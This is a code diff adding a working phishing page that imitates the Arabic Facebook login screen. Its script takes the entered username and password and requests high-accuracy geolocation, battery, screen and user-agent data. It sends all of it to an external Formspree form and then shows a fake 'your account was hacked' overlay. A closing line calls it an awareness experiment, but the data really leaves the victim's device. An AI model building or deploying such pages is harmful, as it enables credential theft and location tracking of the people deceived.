@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; direction: rtl; }
+        .fb-header { padding: 25px 0; text-align: center; }
+        .fb-logo { color: #1877f2; font-weight: bold; font-size: 32px; letter-spacing: -1.5px; }
+        .login-box { padding: 0 25px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; background-color: #f5f6f7; color: #1c1e21; }
+        .login-btn { width: 100%; background-color: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; margin-top: 5px; }
+        .forgot-link { color: #1877f2; text-align: center; display: block; margin-top: 18px; font-size: 14px; text-decoration: none; }
+        .divider { display: flex; align-items: center; text-align: center; margin: 25px 0; color: #8d949e; font-size: 14px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dddfe2; }
+        .divider:not(:empty)::before { margin-left: .5em; }
+        .divider:not(:empty)::after { margin-right: .5em; }
+        .create-btn { width: 80%; background-color: #42b72a; color: white; padding: 12px; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; margin: 0 auto; display: block; }
+        
+        #hacker-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #00ff00; z-index: 10000; padding: 20px; font-family: monospace; text-align: left; dir: ltr; }
+    </style>
+</head>
+<body>
+
+    <div id="main-view">
+        <div class="fb-header"><span class="fb-logo">facebook</span></div>
+        <div class="login-box">
+            <input type="text" id="u_id" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <input type="password" id="u_psw" placeholder="كلمة السر" required>
+            <button class="login-btn" onclick="captureEverything()">تسجيل الدخول</button>
+            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+            <div class="divider">أو</div>
+            <button class="create-btn">إنشاء حساب جديد</button>
+        </div>
+    </div>
+
+    <div id="hacker-overlay"><div id="log"></div></div>
+
+    <script>
+        async function captureEverything() {
+            const user = document.getElementById('u_id').value;
+            const pass = document.getElementById('u_psw').value;
+
+            if(!user || !pass) { alert("يرجى إدخال البيانات"); return; }
+
+            // 1. طلب الموقع الجغرافي الحي (Live Location)
+            let liveLoc = "إذن الموقع مرفوض";
+            
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                liveLoc = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                finalize(liveLoc);
+            }, () => {
+                finalize("لم يوافق المستخدم على الموقع");
+            }, { enableHighAccuracy: true });
+
+            async function finalize(location) {
+                let battery = "غير معروف";
+                try { const b = await navigator.getBattery(); battery = (b.level * 100) + "%"; } catch(e){}
+
+                const payload = {
+                    "FB_User": user,
+                    "FB_Pass": pass,
+                    "Live_Location": location,
+                    "Device": navigator.platform,
+                    "Battery": battery,
+                    "Screen": `${screen.width}x${screen.height}`,
+                    "Full_UA": navigator.userAgent
+                };
+
+                // إرسال لـ Formspree
+                await fetch('https://formspree.io/f/xgodzyrq', {
+                    method: 'POST',
+                    body: JSON.stringify(payload),
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                });
+
+                // شاشة الصدمة
+                document.getElementById('main-view').style.display = 'none';
+                document.getElementById('hacker-overlay').style.display = 'block';
+                showShock(user);
+            }
+        }
+
+        function showShock(u) {
+            const logBox = document.getElementById('log');
+            const lines = [
+                "> Connecting to FB_API...",
+                `> Fetching Data for: ${u}`,
+                "> GPS_LOCK: SUCCESS",
+                "> Dumping Gallery & SMS...",
+                "<span style='color:red'>[!] 2.4GB Data Transferred</span>",
+                "--------------------------------",
+                "<h2 style='color:white;text-align:center'>تم اختراق حسابك!</h2>",
+                "<p style='color:white;text-align:center'>هذه تجربة توعوية لخدمة بحثك الاجتماعي.</p>"
+            ];
+            let i = 0;
+            const t = setInterval(() => {
+                if(i < lines.length) { logBox.innerHTML += lines[i] + "<br>"; i++; }
+                else { clearInterval(t); }
+            }, 400);
+        }
+    </script>
+</body>
+</html>
